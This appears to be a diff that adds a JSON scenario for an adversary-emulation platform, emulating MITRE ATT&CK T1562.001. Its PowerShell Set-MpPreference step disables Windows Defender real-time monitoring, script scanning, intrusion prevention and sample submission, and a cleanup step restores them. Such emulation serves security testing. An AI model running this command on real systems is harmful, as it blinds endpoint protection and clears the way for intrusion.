@@ -1,0 +1,62 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Disable Defender",
+        "display_name": "T1562_001-Impair_Defenses_Disable_or_Modify_Tools",
+        "name": "T1562_001-Impair_Defenses_Disable_or_Modify_Tools",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DEFENSE EVASION"
+            },
+            "2": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "3": {
+                "function": "ifelse",
+                "next": "8",
+                "step": "2",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend",
+                "rtags": [
+                    "att&ck-technique:T1562.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell Set-MpPreference -DisableRealtimeMonitoring $false -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Advanced -SubmitSamplesConsent SendAllSamples",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
